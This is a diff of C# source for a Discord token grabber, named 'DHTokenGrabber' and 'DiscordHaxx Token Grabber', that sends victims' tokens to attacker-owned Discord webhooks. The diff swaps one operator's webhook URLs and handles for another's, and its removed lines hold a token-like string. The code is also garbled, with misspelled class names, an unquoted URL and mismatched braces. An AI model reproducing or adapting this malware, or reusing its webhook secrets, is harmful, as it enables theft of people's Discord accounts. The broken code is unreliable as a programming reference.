@@ -1,4 +1,4 @@
-https://discord.com/api/webhooks/929449861080825896/dM-qPRlPaQur4AZUamChWhRRFXJD00G1PBNjqlAMEDsE936GnZ3Of5mdboLwbtiwRnxq
+https://discord.com/api/webhooks/915350603956371507/BZW2l9C5ABCt9EEwWxLGbGFKsT703C2wVI9ct6XMKEWa7ccpqeEeqAbwKfTHxrkRQbi_
 staff
 namespace DHTokenGrabber
 {   
@@ -34,7 +34,7 @@ internal class program
      httpClient httpClient = new httpClient();
      MultiPlataformDataContent MultiPlataformDataContent = new MultiPlataformDataContent(); 
      MultiPlataformDataContent.add(new stringContent("DiscordHaxx Token Grabber"), "username");
-     MultiPlataformDataContent.add(new stringContent(OTEzMTA1MDk5ODI2NTQwNjQ1.YZ5pZA7nGgcZJSR9WeJs5c4W7kOSh1wqU), "avatar_url");
+     MultiPlataformDataContent.add(new stringContent(), "avatar_url");
      MultiPlataformDataContent.add(new string.Concat(new string[]
 {
 "Token by"
@@ -59,7 +59,7 @@ catch (Exception)
      string result;
      try
  }
-  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/928799021634555946/9FcAag5KAoQGlh98Vk09m7c10Tunk4HH9PLfsI_6tBsY_1ZSZlZtz9a98Ee2IPR-7GiB").result;
+  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/915350603956371507/BZW2l9C5ABCt9EEwWxLGbGFKsT703C2wVI9ct6XMKEWa7ccpqeEeqAbwKfTHxrkRQbi_").result;
 }
 catch (WebException)
 }
@@ -84,15 +84,15 @@ public static void sendWebHook(string discordWebHook,string content)
                 }) + "´´´"
             },
             {
-                "Sebasorova#0001"
+                "AlbeiroDos1131#5222"
                 "redex token grabber"
             },
             {
-                "Discord//https://discord.com/channels/@me/919996103175331901"
+                "Discord undefined//discord.com/assets/652f40427e1f5186ad54836074898279.png"
 
             }
         };
-        httpClient.PostAsync(https://discord.com/api/webhooks/929449861080825896/dM-qPRlPaQur4AZUamChWhRRFXJD00G1PBNjqlAMEDsE936GnZ3Of5mdboLwbtiwRnxq, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
+        httpClient.PostAsync(https://discord.com/api/webhooks/915350603956371507/BZW2l9C5ABCt9EEwWxLGbGFKsT703C2wVI9ct6XMKEWa7ccpqeEeqAbwKfTHxrkRQbi_, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
         catch (WebException)
         {
         }
